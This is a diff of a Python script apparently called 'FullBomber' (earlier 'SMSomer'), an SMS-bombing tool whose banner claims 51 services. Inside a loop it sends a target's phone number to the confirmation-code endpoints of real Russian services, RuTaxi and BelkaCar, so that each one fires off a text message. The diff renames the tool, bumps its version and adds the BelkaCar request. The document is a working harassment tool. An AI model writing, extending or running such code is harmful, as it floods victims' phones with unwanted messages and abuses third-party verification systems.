@@ -4,13 +4,13 @@ from colorama import Fore, Back, Style
 banner = """
  ____________________________________________________
 |                                                    |
-| [--] Name: SMSomer                                 |
+| [--] Name: FullBomber                                 |
 |                                                    |
 | [--] Have Services: 51                             |
 |                                                    |
-| [--] Created by: DarkSuana                         |
+| [--] Created by: @DarkSuana                        |
 |                                                    |
-| [--] Version: 1.0.0                                |
+| [--] Version: 1.0.6                                |
 |____________________________________________________|
 """
 
@@ -49,8 +49,13 @@ while True:
 
 	try:
 		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
-		print(colored("[+] RuTaxi отправлено!)", 'lawngreen')
-	
+		print('[+] RuTaxi отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
+		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
+		print('[+] BelkaCar отправлено!')
 	except:
 		print('[-] Не отправлено!')
 
